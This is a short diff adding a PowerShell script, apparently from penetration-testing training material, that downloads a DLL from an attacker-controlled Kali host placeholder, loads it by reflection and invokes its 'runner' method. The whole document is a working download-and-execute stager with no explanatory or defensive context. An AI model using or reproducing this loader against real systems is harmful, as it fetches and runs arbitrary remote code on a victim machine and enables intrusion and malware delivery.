@@ -1,0 +1,5 @@
+(New-Object System.Net.WebClient).DownloadFile('http://My-Kali-IP/ClassLibrary1.dll', 'C:\Users\Offsec\ClassLibrary1.dll')
+$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ClassLibrary1.dll")
+$class = $assem.GetType("ClassLibrary1.Class1")
+$method = $class.GetMethod("runner")
+$method.Invoke(0, $null)
